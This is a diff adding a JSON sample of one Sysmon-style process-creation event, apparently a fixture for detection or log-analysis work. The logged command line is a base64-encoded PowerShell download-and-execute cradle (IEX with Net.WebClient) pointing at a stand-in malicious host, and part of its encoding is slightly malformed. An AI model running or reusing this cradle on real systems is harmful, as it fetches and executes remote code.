@@ -1,0 +1,12 @@
+[
+  {
+    "EventID": 1,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjaW91AHMAXwBzAGkAdABlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwApAA==",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "User": "CORP\\jdoe",
+    "ProcessId": 4520,
+    "ParentProcessId": 3140,
+    "Timestamp": "2024-01-15T11:30:00.000Z"
+  }
+]
